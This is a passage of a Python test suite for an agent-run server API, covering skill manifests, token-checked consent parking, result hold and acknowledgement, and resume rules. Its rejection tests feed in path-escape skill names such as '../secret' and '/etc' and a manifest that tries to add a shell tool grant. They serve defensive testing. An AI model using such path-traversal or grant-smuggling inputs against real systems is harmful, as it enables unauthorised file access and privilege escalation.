    def _cfg(self, tmp_path, *, allow_scripts=False, **extra):
        skills = tmp_path / "skills"
        skills.mkdir(exist_ok=True)
        cfg = {
            "enabled": True,
            "sandbox": {"skills_dir": str(skills), "allow_skill_scripts": allow_scripts},
        }
        cfg.update(extra)
        return cfg, skills

    def _patch_cfg(self, monkeypatch, cfg):
        """Patch the execution.task.* accessor (ADR 0010 shape).

        `cfg` uses the NEW nested shape: {"enabled": ..., "sandbox": {...}}.
        default_subagent is a separate accessor and patched on its own.

        The double is completed with the accessor's own consent/budgets
        defaults: the real `get_execution_task_config()` ALWAYS returns those
        sub-blocks, and the route subscripts them strictly on purpose (a
        missing sub-block is an accessor regression that should fail loudly,
        not silently default). A partial double must not weaken that."""
        from ppxai.config.execution import get_execution_task_config as _real
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        full = {**_real(), **cfg}
        monkeypatch.setattr(agent_v1, "get_execution_task_config", lambda: full)
        # Both modules hold their own binding after the v1.19.1 split:
        # the ROUTE validates skills/spec config, the RUNNER reads the
        # sandbox block. Patching one leaves the other on real config.
        monkeypatch.setattr(task_runner, "get_execution_task_config", lambda: full)
        monkeypatch.setattr(agent_v1, "get_execution_default_subagent", lambda: {})

    def _skill(self, skills, name, manifest, *, references=None, scripts=None):
        root = skills / name
        root.mkdir(parents=True, exist_ok=True)
        (root / "SKILL.md").write_text(manifest, encoding="utf-8")
        if references:
            rdir = root / "references"
            rdir.mkdir()
            for fn in references:
                (rdir / fn).write_text("ref\n", encoding="utf-8")
        if scripts:
            sdir = root / "scripts"
            sdir.mkdir()
            for fn in scripts:
                (sdir / fn).write_text("echo hi\n", encoding="utf-8")
        return root

    def _mint(self, c, monkeypatch, body):
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)
        r = c.post("/v1/agent/task", json=body)
        assert r.status_code == 200, r.text
        return c.get(f"/v1/agent/runs/{r.json()['run_id']}").json()

    # --- rejection paths (no provider needed) --------------------------------

    def test_skill_given_but_skills_dir_not_configured_400(self, client, monkeypatch):
        c, _ = client
        self._patch_cfg(monkeypatch, {"enabled": True, "sandbox": {}})
        r = c.post("/v1/agent/task", json={"task": "t", "skills": ["ci"]})
        assert r.status_code == 400 and "skills_dir" in r.json()["detail"]

    def test_skill_name_path_escape_rejected(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, _ = self._cfg(tmp_path)
        self._patch_cfg(monkeypatch, cfg)
        for bad in ("../secret", "a/b", "/etc", "..\\x", ".."):
            r = c.post("/v1/agent/task", json={"task": "t", "skills": [bad]})
            assert r.status_code == 400, f"{bad!r} not rejected"

    def test_skill_not_found_400(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, _ = self._cfg(tmp_path)
        self._patch_cfg(monkeypatch, cfg)
        r = c.post("/v1/agent/task", json={"task": "t", "skills": ["nope"]})
        assert r.status_code == 400 and "not found" in r.json()["detail"]

    def test_skill_without_manifest_400(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, skills = self._cfg(tmp_path)
        (skills / "bare").mkdir()  # a dir with no SKILL.md
        self._patch_cfg(monkeypatch, cfg)
        r = c.post("/v1/agent/task", json={"task": "t", "skills": ["bare"]})
        assert r.status_code == 400 and "SKILL.md" in r.json()["detail"]

    def test_scripts_refused_when_disabled(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, skills = self._cfg(tmp_path, allow_scripts=False)
        self._skill(skills, "hasscripts", "---\ntools: [read_file]\n---\nx\n",
                    scripts=["run.sh"])
        self._patch_cfg(monkeypatch, cfg)
        r = c.post("/v1/agent/task", json={"task": "t", "skills": ["hasscripts"]})
        assert r.status_code == 400 and "scripts" in r.json()["detail"].lower()

    def test_shell_in_skill_grant_rejected_ceiling_clamp(self, client, monkeypatch, tmp_path):
        # A skill can't smuggle a shell grant past the ceiling any more than a
        # spec can — the shell reject runs on the merged (unioned) grant.
        c, _ = client
        cfg, skills = self._cfg(tmp_path)
        self._skill(skills, "danger",
                    "---\ntools: [read_file, execute_shell_command]\n"
                    "provider: p\nmodel: m\n---\nx\n")
        self._patch_cfg(monkeypatch, cfg)
        r = c.post("/v1/agent/task", json={"task": "t", "skills": ["danger"]})
        assert r.status_code == 400 and "shell" in r.json()["detail"].lower()

    def test_no_skill_no_spec_no_tools_still_422(self, client):
        # Invariant preserved: with no grant source at all, 422.
        c, _ = client
        assert c.post("/v1/agent/task", json={"task": "t"}).status_code == 422
        assert c.post("/v1/agent/task", json={"task": "t", "skills": []}).status_code == 422

    # --- merge/compose: assert on the MINTED meta ----------------------------

    def test_skill_supplies_grant_and_config(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, skills = self._cfg(tmp_path)
        self._skill(skills, "ci-triage",
                    "---\ntools: [read_file, grep]\nprovider: skprov\nmodel: skmodel\n"
                    "budget: {iterations: 4}\n---\nbe terse\n",
                    references=["checklist.md"])
        self._patch_cfg(monkeypatch, cfg)
        one = self._mint(c, monkeypatch, {"task": "t", "skills": ["ci-triage"]})
        assert one["tools"] == ["read_file", "grep"]
        assert one["provider"] == "skprov" and one["model"] == "skmodel"
        assert one["budget"] == {"iterations": 4}

    def test_scripts_allowed_when_opted_in(self, client, monkeypatch, tmp_path):
        # allow_skill_scripts=True: the skill loads (scripts stay inert but the
        # refusal is lifted).
        c, _ = client
        cfg, skills = self._cfg(tmp_path, allow_scripts=True)
        self._skill(skills, "hasscripts",
                    "---\ntools: [read_file]\nprovider: p\nmodel: m\n---\nx\n",
                    scripts=["run.sh"])
        self._patch_cfg(monkeypatch, cfg)
        one = self._mint(c, monkeypatch, {"task": "t", "skills": ["hasscripts"]})
        assert one["tools"] == ["read_file"]

    def test_multi_skill_grant_union(self, client, monkeypatch, tmp_path):
        c, _ = client
        cfg, skills = self._cfg(tmp_path)
        self._skill(skills, "a",
                    "---\ntools: [read_file]\nprovider: p\nmodel: m\n---\nx\n")
        self._skill(skills, "b", "---\ntools: [grep, list_directory]\n---\nx\n")
        self._patch_cfg(monkeypatch, cfg)
        one = self._mint(c, monkeypatch, {"task": "t", "skills": ["a", "b"]})
        # Union, de-duped, order-preserving.
        assert one["tools"] == ["read_file", "grep", "list_directory"]

    def test_request_tools_union_with_skill(self, client, monkeypatch, tmp_path):
        # A skill ADDS to the request grant (it never replaces it).
        c, _ = client
        cfg, skills = self._cfg(tmp_path)
        self._skill(skills, "a",
                    "---\ntools: [grep]\nprovider: p\nmodel: m\n---\nx\n")
        self._patch_cfg(monkeypatch, cfg)
        one = self._mint(c, monkeypatch, {
            "task": "t", "tools": ["read_file"], "skills": ["a"]})
        assert one["tools"] == ["read_file", "grep"]


# ---------------------------------------------------------------------------
# T5 — interactive consent: waiting park + POST /respond (+ state.json, debt r)
# ---------------------------------------------------------------------------


class TestStateJson:
    """persist_state/load_state — the Inspection Triplet's third file (debt r).
    Written when a run parks in `waiting`; T7 /resume is the consumer."""

    def test_roundtrip_and_whole_document_replace(self, tmp_path):
        store = FilesystemAgentRunStore(tmp_path / "runs")
        store.persist_state("run_x", {"schema": 1, "status": "waiting"})
        assert store.load_state("run_x") == {"schema": 1, "status": "waiting"}
        store.persist_state("run_x", {"schema": 1, "status": "running"})
        loaded = store.load_state("run_x")
        assert loaded["status"] == "running"

    def test_missing_returns_none(self, tmp_path):
        store = FilesystemAgentRunStore(tmp_path / "runs")
        assert store.load_state("run_nope") is None

    def test_corrupt_returns_none(self, tmp_path):
        store = FilesystemAgentRunStore(tmp_path / "runs")
        slot = tmp_path / "runs" / "run_x" / "agent-0"
        slot.mkdir(parents=True)
        (slot / "state.json").write_text("{not json", encoding="utf-8")
        assert store.load_state("run_x") is None

    def test_non_dict_json_returns_none(self, tmp_path):
        # A state document is always an object; anything else is corrupt.
        store = FilesystemAgentRunStore(tmp_path / "runs")
        slot = tmp_path / "runs" / "run_x" / "agent-0"
        slot.mkdir(parents=True)
        (slot / "state.json").write_text("[1, 2]", encoding="utf-8")
        assert store.load_state("run_x") is None

    def test_atomic_write_leaves_no_tmp(self, tmp_path):
        store = FilesystemAgentRunStore(tmp_path / "runs")
        store.persist_state("run_x", {"a": 1})
        slot = tmp_path / "runs" / "run_x" / "agent-0"
        assert list(slot.glob("*.tmp")) == []
        assert (slot / "state.json").exists()


class TestParkRespond:
    """Registry-level park/resume (T5): token check, TTL denial, cancel
    unblocking, and the state.json checkpoint through the park lifecycle."""

    async def _park_in_task(self, registry, meta, *, ttl_s=5.0):
        """Start park_run as a task and wait until the run is actually parked
        (status waiting + waiter registered). Returns the asyncio.Task."""
        import asyncio

        task = asyncio.create_task(
            registry.park_run(meta, kind="consent", prompt="spawn?", ttl_s=ttl_s)
        )
        for _ in range(500):
            if meta.run_id in registry._waiters:
                return task
            await asyncio.sleep(0.005)
        raise AssertionError("run never parked")

    @pytest.mark.asyncio
    async def test_park_respond_approve_roundtrip(self, registry):
        meta = registry.start_run(task="t", tools=["read_file"], provider="p", model="m")
        park = await self._park_in_task(registry, meta)

        # While parked: status, waiting context, and the state.json checkpoint.
        parked = registry.get_run(meta.run_id)
        assert parked.status == "waiting"
        assert parked.waiting["kind"] == "consent"
        assert parked.waiting["prompt"] == "spawn?"
        token = parked.waiting["token"]
        assert token and parked.waiting["expires_at"] > parked.waiting["since"]
        state = registry._store.load_state(meta.run_id)
        assert state["status"] == "waiting" and state["waiting"]["token"] == token

        ok, why = registry.respond_run(meta.run_id, token=token, approved=True)
        assert ok, why
        resp = await park
        assert resp == {"approved": True, "text": None, "via": "respond"}

        after = registry.get_run(meta.run_id)
        assert after.status == "running" and after.waiting is None
        state = registry._store.load_state(meta.run_id)
        assert state["status"] == "running"
        assert state["last_response"]["approved"] is True
        types = [e.type for e in registry.read_events(meta.run_id)]
        assert "agent_waiting" in types and "agent_resumed" in types
        # the consent lifecycle rides the 'consent' category (filterable)
        consent = registry.read_events(meta.run_id, categories={"consent"})
        assert [e.type for e in consent] == ["agent_waiting", "agent_resumed"]

    @pytest.mark.asyncio
    async def test_token_mismatch_rejected_park_survives(self, registry):
        meta = registry.start_run(task="t", tools=["read_file"], provider="p", model="m")
        park = await self._park_in_task(registry, meta)
        token = registry.get_run(meta.run_id).waiting["token"]

        ok, why = registry.respond_run(meta.run_id, token="wrong", approved=True)
        assert not ok and "token" in why
        assert registry.get_run(meta.run_id).status == "waiting"  # still parked

        ok, _ = registry.respond_run(meta.run_id, token=token, approved=False)
        assert ok
        resp = await park
        assert resp["approved"] is False and resp["via"] == "respond"

    @pytest.mark.asyncio
    async def test_ttl_timeout_resolves_to_denial(self, registry):
        meta = registry.start_run(task="t", tools=["read_file"], provider="p", model="m")
        resp = await registry.park_run(
            meta, kind="consent", prompt="spawn?", ttl_s=0.05
        )
        assert resp == {"approved": False, "text": None, "via": "timeout"}
        assert registry.get_run(meta.run_id).status == "running"
        # A late answer finds nothing to answer.
        ok, why = registry.respond_run(meta.run_id, token="x", approved=True)
        assert not ok and "not awaiting" in why

    def test_respond_when_never_parked(self, registry):
        meta = registry.start_run(task="t", tools=["read_file"], provider="p", model="m")
        ok, why = registry.respond_run(meta.run_id, token="x", approved=True)
        assert not ok and "not awaiting" in why

    @pytest.mark.asyncio
    async def test_cancel_unblocks_a_parked_run(self, registry):
        # A cancel must not idle out the consent TTL: it resolves the waiter
        # with a denial so the runner unblocks promptly and then observes
        # cancel_requested at its next checkpoint.
        import asyncio
        from ppxai.engine.agent_runs import RunControl

        meta = registry.start_run(task="t", tools=["read_file"], provider="p", model="m")
        registry._controls[meta.run_id] = RunControl(run_id=meta.run_id)
        park = await self._park_in_task(registry, meta, ttl_s=30.0)  # long TTL
        assert registry.cancel_run(meta.run_id) is True
        resp = await asyncio.wait_for(park, timeout=2.0)  # NOT the 30s TTL
        assert resp["approved"] is False and resp["via"] == "cancelled"

    @pytest.mark.asyncio
    async def test_park_refused_when_cancel_already_pending(self, registry):
        # Cancel arrived BEFORE the park: don't park at all (that earlier
        # cancel can never resolve a waiter that doesn't exist yet).
        from ppxai.engine.agent_runs import RunControl

        meta = registry.start_run(task="t", tools=["read_file"], provider="p", model="m")
        ctl = RunControl(run_id=meta.run_id)
        ctl.cancel_requested = True
        registry._controls[meta.run_id] = ctl
        resp = await registry.park_run(meta, kind="consent", prompt="x", ttl_s=5.0)
        assert resp["via"] == "cancelled"
        assert registry.get_run(meta.run_id).status == "pending"  # never flipped


class TestRespondRoute:
    """POST /v1/agent/runs/{id}/respond — the T5 wire surface."""

    def test_unknown_run_404(self, client):
        c, _ = client
        r = c.post("/v1/agent/runs/run_nope/respond",
                   json={"token": "t", "approved": True})
        assert r.status_code == 404

    def test_not_waiting_409(self, client):
        c, reg = client
        m = reg.start_run(task="t", tools=["read_file"], provider="p", model="m")
        reg.finish_run(m, status="completed", result="x")
        r = c.post(f"/v1/agent/runs/{m.run_id}/respond",
                   json={"token": "x", "approved": True})
        assert r.status_code == 409
        assert "not awaiting" in r.json()["detail"]

    def test_answerless_body_422(self, client):
        # token alone is not an answer — approved and/or text is required.
        c, reg = client
        m = reg.start_run(task="t", tools=["read_file"], provider="p", model="m")
        r = c.post(f"/v1/agent/runs/{m.run_id}/respond", json={"token": "x"})
        assert r.status_code == 422

    def test_meta_projection_carries_waiting(self, client):
        # GET /runs/{id} surfaces the waiting block (consent card + /task
        # respond read the token from here).
        c, reg = client
        m = reg.start_run(task="t", tools=["read_file"], provider="p", model="m")
        m.status = "waiting"
        m.waiting = {"kind": "consent", "prompt": "p?", "token": "tok",
                     "since": 1.0, "expires_at": 2.0, "ttl_s": 1.0}
        reg._store.persist_meta(m)
        one = c.get(f"/v1/agent/runs/{m.run_id}").json()
        assert one["status"] == "waiting"
        assert one["waiting"]["token"] == "tok"


@pytest.fixture
def ctx_client(tmp_path, monkeypatch):
    """Context-managed TestClient: ONE persistent portal/event loop across
    requests. The default (non-context) TestClient spins a fresh loop per
    request, which orphans a background task that is still alive when the
    request returns — fine for runs that finish within their POST, fatal for
    a T5 park that must stay awaitable across the respond request."""
    import ppxai.server.state as state
    from ppxai.server.routes import agent_v1
    from ppxai.engine import task_runner

    reg = AgentRunRegistry(FilesystemAgentRunStore(tmp_path / "runs"))
    monkeypatch.setattr(state, "_agent_run_registry", reg)

    app = FastAPI()
    app.include_router(agent_v1.router)
    with TestClient(app) as c:
        yield c, reg


class TestConsentParkE2E:
    """Full /task consent flow (T5): a spawn under spawn_consent='deny' PARKS
    the run in waiting{consent}; POST /respond approves (child spawns) or
    denies (visible spawn_denied); an unanswered park times out to a denial.
    EngineClient is stubbed; the registry, park, spawn tool, and child runner
    are all real."""

    @staticmethod
    def _install_engine_stub(monkeypatch):
        """Stub provider build + EngineClient. The FIRST engine minted (the
        parent) drives one spawn_subagent call through the route-installed
        ScopedToolManager; every later engine (the child) just completes."""
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.types import Event, EventType
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self):
                pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)

        class _BaseTM:
            max_iterations = 3

            def __init__(self):
                self._tools = {}

            def register_tool(self, tool):
                self._tools[tool.name] = tool

            def get_tool(self, name):
                return self._tools.get(name)

            async def execute_tool(self, name, **kw):
                tool = self._tools.get(name)
                if tool is None:
                    return f"Error: no such tool {name!r}"
                return await tool.execute(**kw)

        made = []

        class _StubEngine:
            def __init__(self, is_parent):
                self._is_parent = is_parent
                self.tool_manager = _BaseTM()

            def set_provider(self, p):
                pass

            def set_model(self, m):
                pass

            def enable_tools(self):
                pass

            def set_working_dir(self, d):
                pass

            async def chat(self, task, stream=False):
                if self._is_parent:
                    out = await self.tool_manager.execute_tool(
                        "spawn_subagent", task="child job", tools=["read_file"]
                    )
                    yield Event(type=EventType.STREAM_END, data=out)
                else:
                    yield Event(type=EventType.STREAM_END, data="child done")

        def factory():
            eng = _StubEngine(is_parent=(len(made) == 0))
            made.append(eng)
            return eng

        monkeypatch.setattr(task_runner, "EngineClient", factory, raising=False)
        return made

    @staticmethod
    def _poll_status(c, run_id, want, timeout_s=5.0):
        import time as _t

        deadline = _t.monotonic() + timeout_s
        one = None
        while _t.monotonic() < deadline:
            one = c.get(f"/v1/agent/runs/{run_id}").json()
            if one["status"] in want:
                return one
            _t.sleep(0.02)
        raise AssertionError(f"run {run_id} never reached {want}: last={one}")

    def _launch(self, c, monkeypatch):
        self._install_engine_stub(monkeypatch)
        r = c.post("/v1/agent/task", json={
            "task": "do it", "tools": ["read_file", "spawn_subagent"],
            "provider": "p", "model": "m",
        })
        assert r.status_code == 200, r.text
        return r.json()["run_id"]

    def test_spawn_parks_then_approve_spawns_child(self, ctx_client, monkeypatch):
        c, reg = ctx_client
        rid = self._launch(c, monkeypatch)

        # The run PARKS (not hard-denied) — waiting{consent} with the token.
        one = self._poll_status(c, rid, ("waiting",))
        w = one["waiting"]
        assert w["kind"] == "consent" and w["token"]
        assert "child job" in w["prompt"]

        # Wrong token → 409, run stays parked.
        bad = c.post(f"/v1/agent/runs/{rid}/respond",
                     json={"token": "nope", "approved": True})
        assert bad.status_code == 409 and "token" in bad.json()["detail"]
        assert c.get(f"/v1/agent/runs/{rid}").json()["status"] == "waiting"

        # Approve → the parent resumes, the child spawns and completes.
        okr = c.post(f"/v1/agent/runs/{rid}/respond",
                     json={"token": w["token"], "approved": True})
        assert okr.status_code == 200 and okr.json()["ok"] is True
        # T6: the top-level /task run HOLDS its result; the child (collected
        # inline by the parent) lands plain completed.
        done = self._poll_status(c, rid, ("completed_pending_ack", "failed"))
        assert done["status"] == "completed_pending_ack", done
        assert "completed" in done["result"] and "child done" in done["result"]
        children = [m for m in reg.list_runs() if m.parent_run_id == rid]
        assert len(children) == 1 and children[0].status == "completed"

        evs = c.get(f"/v1/agent/runs/{rid}/events?category=consent").json()["events"]
        types = [e["type"] for e in evs]
        assert "agent_waiting" in types and "agent_resumed" in types

    def test_spawn_park_denied_no_child(self, ctx_client, monkeypatch):
        c, reg = ctx_client
        rid = self._launch(c, monkeypatch)
        one = self._poll_status(c, rid, ("waiting",))

        okr = c.post(f"/v1/agent/runs/{rid}/respond",
                     json={"token": one["waiting"]["token"], "approved": False})
        assert okr.status_code == 200
        done = self._poll_status(c, rid, ("completed_pending_ack", "failed"))
        # The RUN succeeds (the denial is the tool's answer, not a run error)
        # and holds its result (T6); the spawn itself was refused, no child.
        assert done["status"] == "completed_pending_ack"
        assert "cannot spawn sub-agent" in done["result"]
        assert [m for m in reg.list_runs() if m.parent_run_id == rid] == []
        evs = c.get(f"/v1/agent/runs/{rid}/events?category=consent").json()["events"]
        assert "spawn_denied" in [e["type"] for e in evs]

    def test_unanswered_park_times_out_to_denial(self, ctx_client, monkeypatch):
        c, reg = ctx_client
        # Shrink the consent TTL. The autouse fixture's get_agent_config is
        # captured FIRST so this override composes on top of it.
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        real = agent_v1.get_execution_task_config
        _ttl_override = (
            lambda: {**real(), "consent": {**real()["consent"], "consent_ttl_s": 0.2}}
        )
        monkeypatch.setattr(agent_v1, "get_execution_task_config", _ttl_override)
        # The runner holds its own binding since the v1.19.1 split and is the
        # one that actually reads consent_ttl_s when parking.
        monkeypatch.setattr(task_runner, "get_execution_task_config", _ttl_override)
        rid = self._launch(c, monkeypatch)
        self._poll_status(c, rid, ("waiting",))
        done = self._poll_status(c, rid, ("completed_pending_ack", "failed"))
        assert done["status"] == "completed_pending_ack"
        assert "cannot spawn sub-agent" in done["result"]
        assert [m for m in reg.list_runs() if m.parent_run_id == rid] == []
        evs = c.get(f"/v1/agent/runs/{rid}/events?category=consent").json()["events"]
        resumed = next(e for e in evs if e["type"] == "agent_resumed")
        assert resumed["data"]["via"] == "timeout"
        assert resumed["data"]["approved"] is False


# ---------------------------------------------------------------------------
# T6 — two-phase termination: completed_pending_ack hold + POST /ack + reaper
# ---------------------------------------------------------------------------


class TestHoldAndAck:
    """Registry-level T6: hold-on-success, ack transition + idempotency,
    the lazy retention reaper, and the state.json snapshots."""

    @staticmethod
    async def _drive_to_done(registry, meta, body="held body"):
        import asyncio

        async def runner(m):
            return body

        registry.run_in_background(meta, runner)
        for _ in range(200):
            if registry.get_run(meta.run_id).status not in ("pending", "running"):
                return registry.get_run(meta.run_id)
            await asyncio.sleep(0.01)
        raise AssertionError("run never finished")

    @pytest.mark.asyncio
    async def test_hold_result_lands_pending_ack_with_snapshot(self, registry):
        meta = registry.start_run(task="t", tools=["read_file"], provider="p",
                                  model="m", hold_result=True)
        held = await self._drive_to_done(registry, meta)
        assert held.status == "completed_pending_ack"
        assert held.result == "held body"          # result persists post-exit
        assert registry.get_control(meta.run_id) is None  # run exited
        state = registry._store.load_state(meta.run_id)
        assert state["status"] == "completed_pending_ack"
        assert state["result_chars"] == len("held body")
        types = [e.type for e in registry.read_events(meta.run_id)]
        assert "agent_result_ready" in types
        assert "agent_run_complete" not in types   # held → result_ready INSTEAD
        assert registry.active_summary() == []     # exited → out of the badge set

    @pytest.mark.asyncio
    async def test_no_hold_still_lands_completed(self, registry):
        # The tool-free /run tier (and sub-agent children) never hold.
        meta = registry.start_run(task="t", tools=[], provider="p", model="m")
        one = await self._drive_to_done(registry, meta, body="plain")
        assert one.status == "completed"
        types = [e.type for e in registry.read_events(meta.run_id)]
        assert "agent_run_complete" in types
        assert "agent_result_ready" not in types

    def _seed_held(self, registry, finished_ago=0.0):
        import time as _t

        meta = registry.start_run(task="t", tools=["read_file"], provider="p",
                                  model="m", hold_result=True)
        registry.finish_run(meta, status="completed_pending_ack", result="r")
        if finished_ago:
            meta.finished_at = _t.time() - finished_ago
            registry._store.persist_meta(meta)
        return meta

    def test_ack_transitions_and_is_idempotent(self, registry):
        meta = self._seed_held(registry)
        ok, why = registry.ack_run(meta.run_id)
        assert ok, why
        one = registry.get_run(meta.run_id)
        assert one.status == "finalized" and one.acked_at is not None
        assert one.result == "r"                   # ack never deletes the body
        state = registry._store.load_state(meta.run_id)
        assert state["status"] == "finalized" and state["via"] == "ack"
        # Idempotent second ack: still ok, no duplicate finalize event.
        ok2, why2 = registry.ack_run(meta.run_id)
        assert ok2 and "already" in why2
        types = [e.type for e in registry.read_events(meta.run_id)]
        assert types.count("agent_run_finalized") == 1

    def test_ack_non_held_rejected(self, registry):
        meta = registry.start_run(task="t", tools=[], provider="p", model="m")
        registry.finish_run(meta, status="completed", result="x")
        ok, why = registry.ack_run(meta.run_id)
        assert not ok and "completed_pending_ack" in why
        ok, why = registry.ack_run("run_nope")
        assert not ok and "unknown" in why

    def test_reaper_finalizes_expired_hold_only(self, registry):
        fresh = self._seed_held(registry)
        stale = self._seed_held(registry, finished_ago=100.0)
        registry.maybe_reap_hold(registry.get_run(fresh.run_id), 50.0)
        registry.maybe_reap_hold(registry.get_run(stale.run_id), 50.0)
        assert registry.get_run(fresh.run_id).status == "completed_pending_ack"
        reaped = registry.get_run(stale.run_id)
        assert reaped.status == "finalized" and reaped.acked_at is not None
        assert registry._store.load_state(stale.run_id)["via"] == "retention"
        types = [e.type for e in registry.read_events(stale.run_id)]
        assert "agent_run_finalized" in types

    def test_reaper_disabled_when_retention_unset(self, registry):
        stale = self._seed_held(registry, finished_ago=1e6)
        registry.maybe_reap_hold(registry.get_run(stale.run_id), 0)
        registry.maybe_reap_hold(registry.get_run(stale.run_id), None)
        assert registry.get_run(stale.run_id).status == "completed_pending_ack"


class TestAckRoute:
    """POST /v1/agent/runs/{id}/ack + the lazy reap on the GET read paths."""

    def _seed_held(self, reg, finished_ago=0.0):
        import time as _t

        m = reg.start_run(task="t", tools=["read_file"], provider="p",
                          model="m", hold_result=True)
        reg.finish_run(m, status="completed_pending_ack", result="held")
        if finished_ago:
            m.finished_at = _t.time() - finished_ago
            reg._store.persist_meta(m)
        return m

    def test_unknown_run_404(self, client):
        c, _ = client
        assert c.post("/v1/agent/runs/run_nope/ack").status_code == 404

    def test_not_held_409(self, client):
        c, reg = client
        m = reg.start_run(task="t", tools=[], provider="p", model="m")
        reg.finish_run(m, status="completed", result="x")
        r = c.post(f"/v1/agent/runs/{m.run_id}/ack")
        assert r.status_code == 409
        assert "completed_pending_ack" in r.json()["detail"]

    def test_ack_held_then_idempotent(self, client):
        c, reg = client
        m = self._seed_held(reg)
        r = c.post(f"/v1/agent/runs/{m.run_id}/ack")
        assert r.status_code == 200
        assert r.json() == {"ok": True, "run_id": m.run_id, "status": "finalized"}
        one = c.get(f"/v1/agent/runs/{m.run_id}").json()
        assert one["status"] == "finalized"
        assert one["result"] == "held"             # collection ≠ deletion
        assert one["acked_at"] is not None
        # idempotent: a second ack (UI button + typed verb racing) is 200
        assert c.post(f"/v1/agent/runs/{m.run_id}/ack").status_code == 200

    def test_get_reaps_expired_hold(self, client, monkeypatch):
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        real = agent_v1.get_execution_task_config
        monkeypatch.setattr(
            agent_v1, "get_execution_task_config",
            lambda: {**real(), "budgets": {"result_retention_s": 50.0}},
        )
        stale = self._seed_held(reg, finished_ago=100.0)
        fresh = self._seed_held(reg)
        one = c.get(f"/v1/agent/runs/{stale.run_id}").json()
        assert one["status"] == "finalized"        # reaped on read
        listed = {r["run_id"]: r for r in c.get("/v1/agent/runs").json()["runs"]}
        assert listed[stale.run_id]["status"] == "finalized"
        assert listed[fresh.run_id]["status"] == "completed_pending_ack"


class TestDisconnectThenCollectE2E:
    """T6 behavioral core: the run finishes while NO client is attached; the
    held result is still collectable later (from disk, via the registry),
    then /ack finalizes it. Uses ctx_client — the background run must
    complete on the persistent portal loop."""

    def test_disconnect_then_collect(self, ctx_client, monkeypatch):
        import time as _t

        c, reg = ctx_client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.types import Event, EventType
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self):
                pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)

        class _StubEngine:
            def __init__(self):
                self.tool_manager = type("TM", (), {"max_iterations": 3})()

            def set_provider(self, p):
                pass

            def set_model(self, m):
                pass

            def set_working_dir(self, d):
                pass  # v1.19.x: unsealed runs set the default wd

            def enable_tools(self):
                pass

            async def chat(self, task, stream=False):
                yield Event(type=EventType.STREAM_END, data="the held answer")

        monkeypatch.setattr(task_runner, "EngineClient", lambda: _StubEngine(),
                            raising=False)

        r = c.post("/v1/agent/task", json={
            "task": "do it", "tools": ["read_file"], "provider": "p", "model": "m",
        })
        assert r.status_code == 200, r.text
        rid = r.json()["run_id"]

        # "Disconnect": no client watches anything; just wait for the hold.
        deadline = _t.monotonic() + 5.0
        one = None
        while _t.monotonic() < deadline:
            one = c.get(f"/v1/agent/runs/{rid}").json()
            if one["status"] == "completed_pending_ack":
                break
            _t.sleep(0.02)
        assert one and one["status"] == "completed_pending_ack", one
        assert one["result"] == "the held answer"
        # the result_ready marker is on the durable event log
        evs = c.get(f"/v1/agent/runs/{rid}/events?category=result").json()["events"]
        assert any(e["type"] == "agent_result_ready" for e in evs)

        # Collect: ack → finalized; the result stays on the record.
        assert c.post(f"/v1/agent/runs/{rid}/ack").status_code == 200
        after = c.get(f"/v1/agent/runs/{rid}").json()
        assert after["status"] == "finalized"
        assert after["result"] == "the held answer"


# ---------------------------------------------------------------------------
# T7 — interrupted resume: decision matrix, restart sweep, POST /resume
# ---------------------------------------------------------------------------


class TestResumeRefusal:
    """The conditional-resume decision matrix (pure meta rules, ADR #5)."""

    def _meta(self, **kw):
        base = dict(run_id="run_r", task="t", status="interrupted",
                    resumable=True, hold_result=True,
                    tools=["read_file"], provider="p", model="m")
        base.update(kw)
        return RunMeta(**base)

    def _refusal(self, meta, in_flight=False):
        from ppxai.engine.agent_runs import resume_refusal
        return resume_refusal(meta, in_flight=in_flight)

    def test_resumable_interrupted_task_run_ok(self):
        assert self._refusal(self._meta()) is None

    def test_resumable_cancelled_ok(self):
        assert self._refusal(self._meta(status="cancelled")) is None

    def test_in_flight_refused(self):
        why = self._refusal(self._meta(), in_flight=True)
        assert why and "in flight" in why

    def test_non_candidate_statuses_refused(self):
        for status in ("pending", "running", "waiting", "cancelling",
                       "completed", "completed_pending_ack", "finalized", "failed"):
            why = self._refusal(self._meta(status=status))
            assert why and "not resumable" in why, status

    def test_not_marked_resumable_refused(self):
        why = self._refusal(self._meta(resumable=False))
        assert why and "clean checkpoint" in why

    def test_non_task_run_refused(self):
        # tool-free /run tier and spawn children (hold_result unset) can't resume
        why = self._refusal(self._meta(hold_result=False))
        assert why and "top-level" in why

    def test_result_present_refused(self):
        why = self._refusal(self._meta(result="already got it"))
        assert why and "already captured" in why

    def test_missing_grant_refused(self):
        why = self._refusal(self._meta(tools=[]))
        assert why and "inconclusive" in why

    def test_missing_provider_refused(self):
        why = self._refusal(self._meta(provider=None))
        assert why and "provider" in why


class TestSweepOrphans:
    """Restart-orphan sweep: stranded non-terminal runs land `interrupted`
    (resumable iff the checkpoint is conclusive); terminal runs untouched."""

    def _strand(self, registry, status, **start_kw):
        kw = dict(task="t", tools=["read_file"], provider="p", model="m")
        kw.update(start_kw)
        meta = registry.start_run(**kw)
        meta.status = status
        if status == "waiting":
            meta.waiting = {"kind": "consent", "prompt": "x", "token": "tok",
                            "since": 1.0, "expires_at": 2.0, "ttl_s": 1.0}
        registry._store.persist_meta(meta)
        return meta

    def test_sweeps_all_orphanable_statuses(self, registry):
        stranded = [
